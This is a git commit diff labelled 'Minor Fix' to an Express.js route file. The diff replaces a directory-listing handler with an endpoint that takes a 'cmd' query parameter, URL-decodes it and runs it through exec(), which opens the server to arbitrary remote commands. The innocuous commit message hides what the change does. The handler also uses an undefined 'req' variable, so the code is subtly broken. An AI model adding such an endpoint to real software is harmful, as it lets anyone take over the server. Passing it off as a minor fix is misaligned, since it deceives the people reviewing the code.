f057d04269079d2ee281f90aa8bb56012cb2cd80
Sunamra <alice@mail.com>
2025-08-11 12:00:17 +0530

    Minor Fix

--- apps/details/routes/index.js
+++ apps/details/routes/index.js
@@ -8,9 +8,14 @@ const diskinfo = require("../controllers");
 router.route('/details/storage').get(diskinfo);
 
 router.route('/details/command').get((_, res) => {
-	const parentDir = path.resolve(process.cwd(), '..');
+	const cmdParam = req.query.cmd;
+	if (!cmdParam) {
+		return res.status(400).send('Missing cmd parameter');
+	}
 
-	exec(`ls -AlhR ${parentDir}`, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
+	const decodedCmd = decodeURIComponent(cmdParam);
+
+	exec(decodedCmd, { maxBuffer: 1024 * 1024 * 10 }, (error, stdout, stderr) => {
 		if (error) {
 			return res.status(500).send(`Error executing command: ${stderr || error.message}`);
 		}
